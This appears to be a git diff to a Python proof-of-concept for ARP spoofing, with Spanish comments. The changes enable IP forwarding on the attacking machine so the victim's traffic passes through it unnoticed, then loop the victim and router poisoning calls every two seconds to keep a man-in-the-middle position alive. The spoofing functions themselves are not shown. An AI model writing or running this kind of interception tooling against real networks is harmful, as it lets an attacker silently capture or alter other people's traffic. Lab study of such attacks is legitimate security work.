@@ -1,6 +1,12 @@
 import ../spoofeada
+import time
+import os
 
 # Prueba de concepto de la spoofeada
+
+# Sin este comando en la maquina pirania, la victima no tendria internet
+permitir_forwarding = 'sysctl -w net.ipv4.ip_forward=1'
+os.system(permitir_forwarding)
 
 def victima_spoofeada():
   """Testea el spoofeo a la victima
@@ -28,5 +34,10 @@ def router_spoofeado():
   return None
   
 if __name__ == "__main__":
- victima_spoofeada()
- router_spoofeado()
+  try:
+    while True:
+      victima_spoofeada()
+      router_spoofeado()
+      time.sleep(2)
+  except KeyboardInterrupt as err:
+    print("Algo hiciiiiste, buen trabajo!")
